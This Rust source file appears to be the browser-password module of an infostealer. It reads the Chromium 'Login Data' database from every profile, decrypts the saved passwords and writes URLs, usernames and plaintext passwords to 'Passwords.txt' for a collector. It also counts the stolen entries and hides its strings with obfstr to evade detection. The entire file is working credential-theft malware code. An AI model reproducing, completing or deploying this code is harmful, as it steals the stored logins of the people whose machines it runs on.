use crate::chromium::{decrypt_data, BrowserData};
use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Password};
use alloc::borrow::ToOwned;
use alloc::sync::Arc;
use collector::{Browser, Collector};
use database::TableRecord;
use obfstr::obfstr as s;
use tasks::{parent_name, Task};
use utils::path::Path;

const LOGINS_ORIGIN_URL: usize = 0;
const LOGINS_USERNAME_VALUE: usize = 3;
const LOGINS_PASSWORD_VALUE: usize = 5;

pub(super) struct PasswordsTask {
    browser: Arc<BrowserData>
}

impl PasswordsTask {
    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
        Self { browser }
    }
}

impl<C: Collector> Task<C> for PasswordsTask {
    parent_name!("Passwords.txt");

    unsafe fn run(&self, parent: &Path, collector: &C) {
        let Some(passwords) = collect_and_read_sqlite_from_all_profiles(
            &self.browser.profiles,
            |profile| profile / s!("Login Data"),
            s!("Logins"),
            |record| extract_password_from_record(record, &self.browser)
        ) else {
            return
        };

        collector.get_browser().increase_passwords_by(passwords.len());
        let _ = to_string_and_write_all(&passwords, "\n\n", parent);
    }
}

fn extract_password_from_record(record: &dyn TableRecord, browser_data: &BrowserData) -> Option<Password> {
    let origin = record
        .get_value(LOGINS_ORIGIN_URL)
        .and_then(|value| value.as_string())
        .map(|s| s.to_owned());

    let username = record
        .get_value(LOGINS_USERNAME_VALUE)
        .and_then(|value| value.as_string())
        .map(|s| s.to_owned());

    let password = record
        .get_value(LOGINS_PASSWORD_VALUE)
        .and_then(|value| value.as_blob())
        .and_then(|blob| unsafe { decrypt_data(blob, browser_data) });

    if let (None, None) = (&username, &password) {
        return None
    }

    Some(Password {
        origin,
        username,
        password
    })
}